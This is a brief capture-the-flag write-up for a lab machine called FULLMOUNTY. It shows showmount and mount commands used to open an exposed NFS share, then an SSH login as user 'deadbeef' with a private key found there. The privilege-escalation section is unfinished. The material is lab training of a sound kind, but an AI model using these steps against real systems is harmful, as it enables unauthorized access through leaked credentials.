### FULLMOUNTY

#### Nmap scan

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/dd23e073-c340-45ae-a2e2-dd28af07eaed)

enumerating other ports gives nothing

so let's move to nfs

so let's list the shares and mount it

```mkdir /tmp/mount```

```showmount -e 10.150.150.134```

```sudo mount -t nfs -o vers=3 10.150.150.134:/srv/exportnfs /tmp/mount/ -o nolock```

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/23fda0de-c7d7-47fa-adc2-f7896d027f0f)

we have an ssh private key which can be used to ssh into the box

reading the public key we have a user ```deadbeef```

so ```ssh -i id_rsa deadbeef@10.150.150.134```
![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/c9e63b9b-276b-46c1-ac5c-4594ec4a7c93)

so we have the user flag.

#### Privilege escalation


*IG the box is broken and can't execute binary file on it*

*Till next time 1337*
*contact me if you're able to root it*




